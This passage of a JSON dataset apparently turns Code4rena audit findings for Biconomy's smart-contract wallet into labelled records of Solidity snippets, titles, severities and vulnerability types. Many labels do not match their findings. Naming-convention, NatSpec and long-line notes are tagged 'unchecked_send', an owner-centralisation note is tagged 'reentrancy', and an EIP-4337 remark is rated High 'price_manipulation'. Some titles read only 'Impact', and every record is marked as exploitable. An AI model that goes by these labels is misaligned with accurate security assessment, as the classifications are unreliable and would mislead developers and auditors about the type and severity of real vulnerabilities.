    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "js\ncontracts/smart-contract-wallet/SmartAccountFactory.sol:\n  28       * @param _owner EOA signatory of the wallet\n  29:      * @param _entryPoint AA 4337 entry point address\n  30       * @param _handler fallback handler address\n\n  49       * @param _owner EOA signatory of the wallet\n  50:      * @param _entryPoint AA 4337 entry point address\n  51       * @param _handler fallback handler address\n\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol:\n  1  /**\n  2:  ** Account-Abstraction (EIP-4337) singleton EntryPoint implementation.\n  3   ** Only one instance required on each chain.\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol:\n  1  /**\n  2:  ** Account-Abstraction (EIP-4337) singleton EntryPoint implementation.\n  3   ** Only one instance required on each chain.\n\ncontracts/smart-contract-wallet/aa-4337/samples/DepositPaymaster.sol:\n  21   * paymasterAndData holds the paymaster address followed by the token address to use.\n  22:  * @notice This paymaster will be rejected by the standard rules of EIP4337, as it uses an external oracle.\n  23   * (the standard rules ban accessing data of an external contract)\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "High",
    "title": "[L-02] Use of EIP 4337, which is likely to change, not recommended for general use or application",
    "description": "contracts/smart-contract-wallet/SmartAccountFactory.sol: 28       * @param _owner EOA signatory of the wallet 29:      * @param _entryPoint AA 4337 entry point address 30       * @param _handler fallback handler address 49       * @param _owner EOA signatory of the wallet",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 25,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n\ncontracts/smart-contract-wallet/aa-4337/core/StakeManager.sol:\n  114       */\n  115:     function withdrawTo(address payable withdrawAddress, uint256 withdrawAmount) external {\n  116:         DepositInfo storage info = deposits[msg.sender];\n  117:         require(withdrawAmount <= info.deposit, \"Withdraw amount too large\");\n  118:         info.deposit = uint112(info.deposit - withdrawAmount);\n  119:         emit Withdrawn(msg.sender, withdrawAddress, withdrawAmount);\n  120:         (bool success,) = withdrawAddress.call{value : withdrawAmount}(\"\");\n  121:         require(success, \"failed to withdraw\");\n  122:     }\n  123  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "[L-03] Consider using OpenZeppelin's SafeCast library to prevent unexpected overflows when casting from uint256",
    "description": "contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol: 114       */ 115:     function withdrawTo(address payable withdrawAddress, uint256 withdrawAmount) external { 116:         DepositInfo storage info = deposits[msg.sender]; 117:         require(withdrawAmount <= info.deposit, \"Withdraw amount too large\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.643,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\ncontracts\\smart-contract-wallet\\SmartAccount.sol#l451\n  449     function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n- 451:       (bool success,) = dest.call{value:amount}(\"\");                              \n+            assembly {                                    \n+                success := call(gas(), dest, amount, 0, 0)\n+            }                                             \n+                                                          \n  452            require(success,\"transfer failed\");\n  453       }\n  454\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "[L-04] Gas griefing/theft is possible on unsafe external call",
    "description": "`return` data `(bool success,)` has to be stored due to EVM architecture, if in a usage like below, 'out' and 'outsize' values are given (0,0) . Thus, This storage disappears and may come from external contracts a possible Gas griefing/theft problem is avoided https://twitter.com/pashovkrum/status/1607024043718316032?t=xs30iD6ORWtE2bTTYsCFIQ&s=19 There are 8 instances of the topic. contracts\\smart-contract-wallet\\SmartAccount.sol#l451 449     function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.559,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "js\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol:\n  64      */\n  65:     function setSigner( address _newVerifyingSigner) external onlyOwner{\n  66:         require(_newVerifyingSigner != address(0), \"VerifyingPaymaster: new signer can not be zero address\");\n  67:         verifyingSigner = _newVerifyingSigner;\n  68:     }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "[L-05] Front running attacks by the `onlyOwner`",
    "description": "`verifyingSigner` value is not a constant value and can be changed with `setSigner` function, before a function using `verifyingSigner` state variable value in the project, `setSigner` function can be triggered by `onlyOwner` and operations can be blocked contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol: 64      */ 65:     function setSigner( address _newVerifyingSigner) external onlyOwner{ 66:         require(_newVerifyingSigner != address(0), \"VerifyingPaymaster: new signer can not be zero address\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.373,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "js\n\n14 results - 3 files\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n   72:     // onlyOwner\n   76:     modifier onlyOwner {\n   81:     // onlyOwner OR self\n  449:     function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n  455:     function pullTokens(address token, address dest, uint256 amount) external onlyOwner {\n  460:     function execute(address dest, uint value, bytes calldata func) external onlyOwner{\n  465:     function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{\n  536:     function withdrawDepositTo(address payable withdrawAddress, uint256 amount) public onlyOwner {\n\ncontracts/smart-contract-wallet/paymasters/BasePaymaster.sol:\n  24:     function setEntryPoint(IEntryPoint _entryPoint) public onlyOwner {\n  67:     function withdrawTo(address payable withdrawAddress, uint256 amount) public virtual onlyOwner {\n  75:     function addStake(uint32 unstakeDelaySec) external payable onlyOwner {\n  90:     function unlockStake() external onlyOwner {\n  99:     function withdrawStake(address payable withdrawAddress) external onlyOwner {\n\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol:\n  65:     function setSigner( address _newVerifyingSigner) external onlyOwner{\n\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "Impact",
    "description": "The `onlyOwner` role has a single point of failure and `onlyOwner` can use critical a few functions. Even if protocol admins/developers are not malicious there is still a chance for Owner keys to be stolen. In such a case, the attacker can cause serious damage to the project due to important functions. In such a case, users who have invested in project will suffer high financial losses. ` onlyOwner ` functions; 14 results - 3 files contracts/smart-contract-wallet/SmartAccount.sol:",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 26,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n\n2 results - 1 file\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  264:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n  288:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Low",
    "title": "[L-07] Loss of precision due to rounding",
    "description": "Add scalars so roundings are negligible 2 results - 1 file contracts/smart-contract-wallet/SmartAccount.sol: 264:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor); 288:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.254,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "js\nStorage Gaps\nThis makes the storage layouts incompatible, as explained in\u00a0Writing Upgradeable Contracts. \nThe size of the\u00a0__gap\u00a0array is calculated so that the amount of storage used by a contract \nalways adds up to the same number (in this case 50 storage slots).\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Impact",
    "description": "For upgradeable contracts, inheriting contracts may introduce new variables. In order to be able to add new variables to the upgradeable contract without causing storage collisions, a storage gap should be added to the upgradeable contract. If no storage gap is added, when the upgradable contract introduces new variables, it may override the variables in the inheriting contract. Storage gaps are a convention for reserving storage slots in a base contract, allowing future versions of that contract to use up those slots without affecting the storage layout of child contracts. To create a storage gap, declare a fixed-size array in the base contract with an initial number of slots.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.268,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n function init(address _owner, address _entryPointAddress, address _handler) public override initializer { \n        require(owner == address(0), \"Already initialized\");\n        require(address(_entryPoint) == address(0), \"Already initialized\");\n        require(_owner != address(0),\"Invalid owner\");\n        require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n        require(_handler != address(0), \"Invalid Entrypoint\");\n        owner = _owner;\n        _entryPoint =  IEntryPoint(payable(_entryPointAddress));\n        if (_handler != address(0)) internalSetFallbackHandler(_handler);\n        setupModules(address(0), bytes(\"\"));\n    }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-09] Missing Event for critical parameters init and change",
    "description": "**Context:** function init(address _owner, address _entryPointAddress, address _handler) public override initializer { require(owner == address(0), \"Already initialized\"); require(address(_entryPoint) == address(0), \"Already initialized\"); require(_owner != address(0),\"Invalid owner\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.66,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n1 result - 1 file\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  109:     function setOwner(address _newOwner) external mixedAuth {\n  110:         require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n  111:         address oldOwner = owner;\n  112:         owner = _newOwner;\n  113:         emit EOAChanged(address(this), oldOwner, _newOwner);\n  114:     }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-10] Use `2StepSetOwner ` instead of ` setOwner `",
    "description": "1 result - 1 file contracts/smart-contract-wallet/SmartAccount.sol: 109:     function setOwner(address _newOwner) external mixedAuth { 110:         require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\"); 111:         address oldOwner = owner;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.409,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  166:     function init(address _owner, address _entryPointAddress, address _handler) public override initializer { \n  167:         require(owner == address(0), \"Already initialized\");\n  168:         require(address(_entryPoint) == address(0), \"Already initialized\");\n  169:         require(_owner != address(0),\"Invalid owner\");\n  170:         require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n  171:         require(_handler != address(0), \"Invalid Entrypoint\");\n  172:         owner = _owner;\n  173:         _entryPoint =  IEntryPoint(payable(_entryPointAddress));\n  174:         if (_handler != address(0)) internalSetFallbackHandler(_handler);\n  175:         setupModules(address(0), bytes(\"\"));\n  176:     }\n\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-11] init() function can be called by anybody",
    "description": "`init()` function can be called anybody when the contract is not initialized. More importantly, if someone else runs this function, they will have full authority because of the `owner` state variable. Here is a definition of `init()` function. contracts/smart-contract-wallet/SmartAccount.sol: 166:     function init(address _owner, address _entryPointAddress, address _handler) public override initializer {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.791,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  192:     function execTransaction(\n  193:         Transaction memory _tx,\n  194:         uint256 batchId,\n  195:         FeeRefund memory refundInfo,\n  196:         bytes memory signatures\n  197:     ) public payable virtual override returns (bool success) {\n  198:         // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4\n  199:         //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\n  200:         uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\n  201:         //console.log(\"init %s\", 21000 + msg.data.length * 8);\n  202:         bytes32 txHash;\n  203:         // Use scope here to limit variable lifetime and prevent `stack too deep` errors\n  204:         {\n  205:             bytes memory txHashData =\n  206:                 encodeTransactionData(\n  207:                     // Transaction info\n  208:                     _tx,\n  209:                     // Payment info\n  210:                     refundInfo,\n  211:                     // Signature info\n  212:                     nonces[batchId]\n  213:                 );\n  214:             // Increase nonce and execute transaction.\n  215:             // Default space aka batchId is 0\n  216:             nonces[batchId]++;\n  217:             txHash = keccak256(txHashData);\n  218:             checkSignatures(txHash, txHashData, signatures);\n  219:         }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[L-12] The minimum transaction value of 21,000 gas may change in the future",
    "description": "Any transaction has a 'base fee' of 21,000 gas in order to cover the cost of an elliptic curve operation that recovers the sender address from the signature, as well as the disk space of storing the transaction, according to the Ethereum White Paper contracts/smart-contract-wallet/SmartAccount.sol: 192:     function execTransaction( 193:         Transaction memory _tx, 194:         uint256 batchId,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 32,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  108  \n  109:     function setOwner(address _newOwner) external mixedAuth {\n  110:         require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n  111:         address oldOwner = owner;\n  112:         owner = _newOwner;\n  113:         emit EOAChanged(address(this), oldOwner, _newOwner);\n  114:     }\n  115 \n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "High",
    "title": "[N-06] Add a timelock to critical functions",
    "description": "It is a good practice to give time for users to react and adjust to critical changes. A timelock provides more guarantees and reduces the level of trust required, thus decreasing risk for users. It also indicates that the project is legitimate (less risk of a malicious owner making a sandwich attack on a user). Consider adding a timelock to: contracts/smart-contract-wallet/SmartAccount.sol: 108 109:     function setOwner(address _newOwner) external mixedAuth {",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.405,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "js\nimport {Owned} from \"solmate/auth/Owned.sol\";\nimport {ERC721} from \"solmate/tokens/ERC721.sol\";\nimport {LibString} from \"solmate/utils/LibString.sol\";\nimport {MerkleProofLib} from \"solmate/utils/MerkleProofLib.sol\";\nimport {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\nimport {ERC1155, ERC1155TokenReceiver} from \"solmate/tokens/ERC1155.sol\";\nimport {toWadUnsafe, toDaysWadUnsafe} from \"solmate/utils/SignedWadMath.sol\";\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[N-07] For modern and more readable code; update import usages",
    "description": "**Context:** All Contracts (116 results - 40 files) **Description:** Solidity code is also cleaner in another way\u00a0that might not be noticeable: the\u00a0struct Point. We were importing it previously with global import but not using it. The\u00a0Point\u00a0struct `polluted the source code` with an unnecessary object we were not using because we did not need it. This was breaking the rule of modularity and modular programming: `only import what you need` Specific imports with curly braces allow us to apply this rule better.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.442,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "js\n    /// @notice Adds liquidity for the given recipient/tickLower/tickUpper position\n    /// @dev The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback\n    /// in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends\n    /// on tickLower, tickUpper, the amount of liquidity, and the current price.\n    /// @param recipient The address for which the liquidity will be created\n    /// @param tickLower The lower tick of the position in which to add liquidity\n    /// @param tickUpper The upper tick of the position in which to add liquidity\n    /// @param amount The amount of liquidity to mint\n    /// @param data Any data that should be passed through to the callback\n    /// @return amount0 The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback\n    /// @return amount1 The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback\n    function mint(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount,\n        bytes calldata data\n    ) external returns (uint256 amount0, uint256 amount1);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[N-08] Include return parameters in NatSpec comments",
    "description": "**Context:** All Contracts **Description:** It is recommended that Solidity contracts are fully annotated using NatSpec for all public interfaces (everything in the ABI). It is clearly stated in the Solidity official documentation. In complex projects such as Defi, the interpretation of all functions and their arguments and returns is important for code readability and auditability. https://docs.soliditylang.org/en/v0.8.15/natspec-format.html",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "js\nthisFunctionCallIsReallyLong(\n    longArgument1,\n    longArgument2,\n    longArgument3\n);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[N-09] Long lines are not suitable for the \u2018Solidity Style Guide\u2019",
    "description": "**Context:** [EntryPoint.sol#L168](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L168) [EntryPoint.sol#L289](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L289) [EntryPoint.sol#L319](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L319) [EntryPoint.sol#L349](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L349)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.092,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n23 results - 5 files\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  470:             unchecked {\n\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol:\n   73:     unchecked {\n   85:     } //unchecked\n  185:     unchecked {\n  249:     unchecked {\n  291:     unchecked {\n  350:     unchecked {\n  417:     unchecked {\n  442:     unchecked {\n  477:     } // unchecked\n  485:     unchecked {\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol:\n  46:     unchecked {\n\ncontracts/smart-contract-wallet/libs/Math.sol:\n   60:         unchecked {\n  179:         unchecked {\n  195:         unchecked {\n  207:         unchecked {\n  248:         unchecked {\n  260:         unchecked {\n  297:         unchecked {\n  311:         unchecked {\n  340:         unchecked {\n\ncontracts/smart-contract-wallet/libs/Strings.sol:\n  19:         unchecked {\n  44:         unchecked {\n\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "[N-10] Need Fuzzing test",
    "description": "**Context:** 23 results - 5 files contracts/smart-contract-wallet/SmartAccount.sol: 470:             unchecked { contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 38,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.898,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n38 results - 11 files\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  181:     function max(uint256 a, uint256 b) internal pure returns (uint256) {\n\ncontracts/smart-contract-wallet/aa-4337/core/StakeManager.sol:\n  23:     function getStakeInfo(address addr) internal view returns (StakeInfo memory info) {\n  38:     function internalIncrementDeposit(address account, uint256 amount) internal {\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol:\n  36:     function getSender(UserOperation calldata userOp) internal pure returns (address) {\n  45:     function gasPrice(UserOperation calldata userOp) internal view returns (uint256) {\n  57:     function pack(UserOperation calldata userOp) internal pure returns (bytes memory ret) {\n  73:     function hash(UserOperation calldata userOp) internal pure returns (bytes32) {\n  77:     function min(uint256 a, uint256 b) internal pure returns (uint256) {\n\ncontracts/smart-contract-wallet/aa-4337/utils/Exec.sol:\n  13:     ) internal returns (bool success) {\n  23:     ) internal view returns (bool success) {\n  33:     ) internal returns (bool success) {\n  40:     function getReturnData() internal pure returns (bytes memory returnData) {\n  51:     function revertWithData(bytes memory returnData) internal pure {\n  57:     function callAndRevert(address to, bytes memory data) internal {\n\ncontracts/smart-contract-wallet/base/Executor.sol:\n  19:     ) internal returns (bool success) {\n\ncontracts/smart-contract-wallet/base/FallbackManager.sol:\n  14:     function internalSetFallbackHandler(address handler) internal {\n\ncontracts/smart-contract-wallet/base/ModuleManager.sol:\n  16:     address internal constant SENTINEL_MODULES = address(0x1);\n  18:     mapping(address => address) internal modules;\n  20:     function setupModules(address to, bytes memory data) internal {\n\ncontracts/smart-contract-wallet/common/SecuredTokenTransfer.sol:\n  14:     ) internal returns (bool transferred) {\n\ncontracts/smart-contract-wallet/libs/LibAddress.sol:\n  11:   function isContract(address account) internal view returns (bool) {\n\ncontracts/smart-contract-wallet/libs/Math.sol:\n   19:     function max(uint256 a, uint256 b) internal pure returns (uint256) {\n   26:     function min(uint256 a, uint256 b) internal pure returns (uint256) {\n   34:     function average(uint256 a, uint256 b) internal pure returns (uint256) {\n   45:     function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {\n   59:     ) internal pure returns (uint256 result) {\n  145:     ) internal pure returns (uint256) {\n  158:     function sqrt(uint256 a) internal pure returns (uint256) {\n  194:     function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {\n  205:     function log2(uint256 value) internal pure returns (uint256) {\n  247:     function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {\n  258:     function log10(uint256 value) internal pure returns (uint256) {\n  296:     function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {\n  309:     function log256(uint256 value) internal pure returns (uint256) {\n  339:     function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {\n\ncontracts/smart-contract-wallet/paymasters/PaymasterHelpers.sol:\n  27:     ) internal pure returns (bytes memory context) {\n  34:     function decodePaymasterData(UserOperation calldata op) internal pure returns (PaymasterData memory) {\n  43:     function decodePaymasterContext(bytes memory context) internal pure returns (PaymasterContext memory) {\n\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[N-13] For functions, follow Solidity standard naming conventions (internal function style rule)",
    "description": "**Context:** 38 results - 11 files contracts/smart-contract-wallet/SmartAccount.sol: 181:     function max(uint256 a, uint256 b) internal pure returns (uint256) { contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 65,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol:\n  255:         // TODO: copy logic of gasPrice?\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "dos",
    "severity": "Medium",
    "title": "[N-15] Open TODOs",
    "description": "**Context:** contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol: 255:         // TODO: copy logic of gasPrice? **Recommendation:** Use temporary TODOs as you work on a feature, but make sure to treat them before merging. Either add a link to a proper issue in your TODO, or remove it from the code.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.119,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  166:     function init(address _owner, address _entryPointAddress, address _handler) public override initializer { \n  167:         require(owner == address(0), \"Already initialized\");\n  168:         require(address(_entryPoint) == address(0), \"Already initialized\");\n  169:         require(_owner != address(0),\"Invalid owner\");\n  170:         require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n  171:         require(_handler != address(0), \"Invalid Entrypoint\");\n  172:         owner = _owner;\n  173:         _entryPoint =  IEntryPoint(payable(_entryPointAddress));\n  174:         if (_handler != address(0)) internalSetFallbackHandler(_handler);\n  175:         setupModules(address(0), bytes(\"\"));\n  176:     }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[N-16] Mark visibility of\u00a0init(...)\u00a0functions as\u00a0``external``",
    "description": "contracts/smart-contract-wallet/SmartAccount.sol: 166:     function init(address _owner, address _entryPointAddress, address _handler) public override initializer { 167:         require(owner == address(0), \"Already initialized\"); 168:         require(address(_entryPoint) == address(0), \"Already initialized\"); 169:         require(_owner != address(0),\"Invalid owner\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.79,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
